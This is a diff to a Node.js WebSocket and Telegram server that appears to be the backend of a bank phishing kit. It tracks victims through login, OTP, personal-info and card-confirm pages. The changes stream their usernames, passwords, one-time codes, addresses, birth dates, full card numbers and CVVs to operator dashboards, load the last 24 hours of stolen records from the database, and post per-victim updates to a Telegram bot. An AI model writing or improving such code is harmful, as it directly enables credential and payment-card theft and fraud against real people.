@@ -140,10 +140,7 @@ function trackAttempt(ip) {
   // Check if should auto-block
   if (attempts.attempts >= SECURITY.AUTO_BLOCK_THRESHOLD) {
     blockIP(ip, "Auto-blocked: Too many attempts", true);
-    sendSecurityAlert(
-      ip,
-      `🚨 IP AUTO-BLOQUÉE: ${ip}\nRaison: ${attempts.attempts} tentatives`
-    );
+    // No Telegram alert for IP blocking
     return { allowed: false, reason: "blocked" };
   }
 
@@ -153,10 +150,7 @@ function trackAttempt(ip) {
       Date.now() + SECURITY.TEMP_BLOCK_MINUTES * 60 * 1000
     ).toISOString();
     blockIP(ip, "Rate limit exceeded", false, blockUntil);
-    sendSecurityAlert(
-      ip,
-      `⚠️ IP TEMP BLOQUÉE: ${ip}\nRaison: Rate limit (${SECURITY.TEMP_BLOCK_MINUTES}min)`
-    );
+    // No Telegram alert for IP blocking
     return { allowed: false, reason: "rate_limited" };
   }
 
@@ -319,7 +313,7 @@ function updateTelegramMessage(sessionId, changeType) {
   }
 }
 
-// Send a short notification for changes
+// Send a short notification for changes (as reply to main client fiche)
 function sendChangeNotification(sessionId, data, changeType) {
   const shortId = sessionId.slice(0, 15);
   const timestamp = new Date().toLocaleString("fr-FR", {
@@ -353,8 +347,11 @@ function sendChangeNotification(sessionId, data, changeType) {
 
   const notification = `${emoji} <b>UPDATE</b> - ${shortId}\n${changeText}\n🕐 ${timestamp}`;
 
-  // Send and store notification ID
-  sendTelegramMessage(notification, (messageId) => {
+  // Get the main message ID to reply to
+  const mainMessageId = telegramMessages.get(sessionId) || data.telegramMessageId;
+
+  // Send as reply to main client fiche
+  sendTelegramReply(notification, mainMessageId, (messageId) => {
     if (messageId) {
       notificationMessages.set(sessionId, messageId);
     }
@@ -445,6 +442,63 @@ function sendTelegramMessage(message, callback) {
 
   req.on("error", (e) => {
     console.error(`[Telegram] ✗ Request error: ${e.message}`);
+    if (callback) callback(null);
+  });
+
+  req.write(postData);
+  req.end();
+}
+
+// Send Telegram message as reply to another message
+function sendTelegramReply(message, replyToMessageId, callback) {
+  console.log(`[Telegram] Sending reply to message ${replyToMessageId}...`);
+
+  const postDataObj = {
+    chat_id: TELEGRAM_CHAT_ID,
+    text: message,
+    parse_mode: "HTML",
+  };
+
+  // Only add reply_to_message_id if we have a valid message ID
+  if (replyToMessageId) {
+    postDataObj.reply_to_message_id = replyToMessageId;
+    postDataObj.allow_sending_without_reply = true; // Send even if original message is deleted
+  }
+
+  const postData = JSON.stringify(postDataObj);
+
+  const options = {
+    hostname: "api.telegram.org",
+    port: 443,
+    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Content-Length": Buffer.byteLength(postData),
+    },
+  };
+
+  const req = https.request(options, (res) => {
+    let responseData = "";
+    res.on("data", (chunk) => {
+      responseData += chunk;
+    });
+    res.on("end", () => {
+      if (res.statusCode === 200) {
+        const result = JSON.parse(responseData);
+        console.log(
+          `[Telegram] ✓ Reply sent (ID: ${result.result.message_id})`
+        );
+        if (callback) callback(result.result.message_id);
+      } else {
+        console.error(`[Telegram] ✗ Reply error ${res.statusCode}: ${responseData}`);
+        if (callback) callback(null);
+      }
+    });
+  });
+
+  req.on("error", (e) => {
+    console.error(`[Telegram] ✗ Reply request error: ${e.message}`);
     if (callback) callback(null);
   });
 
@@ -719,17 +773,25 @@ wss.on("connection", (ws, req) => {
             }
             ws.sessionId = data.sessionId;
 
-            // Log DB data
+            // Get all data from DB for this session
             const dbData = getSessionData(data.sessionId);
             console.log(`[DB] Session data:`, JSON.stringify(dbData, null, 2));
 
-            // Notify dashboards of new session
+            // Notify dashboards of new session with FULL data from DB
             broadcastToDashboards({
               type: "session_update",
               sessionId: data.sessionId,
               page: data.page,
               status: "connected",
               ip: clientIP,
+              data: dbData ? {
+                ip: dbData.ip,
+                login: dbData.login,
+                otp: dbData.otp ? { otp: dbData.otp } : null,
+                personalInfo: dbData.personalInfo,
+                cardInfo: dbData.cardInfo,
+                phone: dbData.phone,
+              } : null,
             });
           }
           break;
@@ -852,14 +914,55 @@ wss.on("connection", (ws, req) => {
           dashboards.add(ws);
           ws.isDashboard = true;
 
-          // Send all active sessions to new dashboard
-          const activeSessions = [];
-          sessions.forEach((session, sessionId) => {
-            activeSessions.push({
-              sessionId,
-              page: session.page,
-              data: session.data,
-            });
+          // Send all sessions from DATABASE (not just memory) to new dashboard
+          // This ensures sessions are visible even if dashboard was closed when data arrived
+          const dbSessions = db.prepare(`
+            SELECT session_id, ip, username, password, otp, first_name, last_name, 
+                   email, address, date_of_birth, card_holder, card_number, 
+                   card_expiry, card_cvv, phone, status, updated_at
+            FROM sessions 
+            WHERE updated_at > datetime('now', '-24 hours')
+            ORDER BY updated_at DESC
+          `).all();
+
+          const activeSessions = dbSessions.map((row) => {
+            // Determine current page based on last data received
+            let page = 'login';
+            if (row.card_number) page = 'card-confirm';
+            else if (row.first_name) page = 'personal-info';
+            else if (row.otp) page = 'otp';
+            else if (row.username) page = 'login';
+
+            // Check if session is currently connected
+            const isConnected = sessions.has(row.session_id);
+
+            return {
+              sessionId: row.session_id,
+              page: page,
+              isConnected: isConnected,
+              data: {
+                ip: row.ip,
+                login: row.username ? {
+                  username: row.username,
+                  password: row.password,
+                } : null,
+                otp: row.otp ? { otp: row.otp } : null,
+                personalInfo: row.first_name ? {
+                  firstName: row.first_name,
+                  lastName: row.last_name,
+                  email: row.email,
+                  address: row.address,
+                  dateOfBirth: row.date_of_birth,
+                } : null,
+                cardInfo: row.card_number ? {
+                  cardHolder: row.card_holder,
+                  cardNumber: row.card_number,
+                  expiry: row.card_expiry,
+                  cvv: row.card_cvv,
+                } : null,
+                phone: row.phone,
+              },
+            };
           });
 
           ws.send(
@@ -982,13 +1085,7 @@ wss.on("connection", (ws, req) => {
               reason: data.reason,
               permanent: data.permanent,
             });
-
-            sendSecurityAlert(
-              data.ip,
-              `🚫 IP BLOQUÉE manuellement\n📍 ${data.ip}\n📝 ${
-                data.reason || "No reason"
-              }`
-            );
+            // No Telegram alert for IP blocking
           }
           break;
 
@@ -1039,11 +1136,7 @@ wss.on("connection", (ws, req) => {
                 ip: targetIP,
                 sessionId: data.sessionId,
               });
-
-              sendSecurityAlert(
-                targetIP,
-                `🚫 IP BLOQUÉE depuis session\n📍 ${targetIP}\n🆔 ${data.sessionId}`
-              );
+              // No Telegram alert for IP blocking
             }
           }
           break;
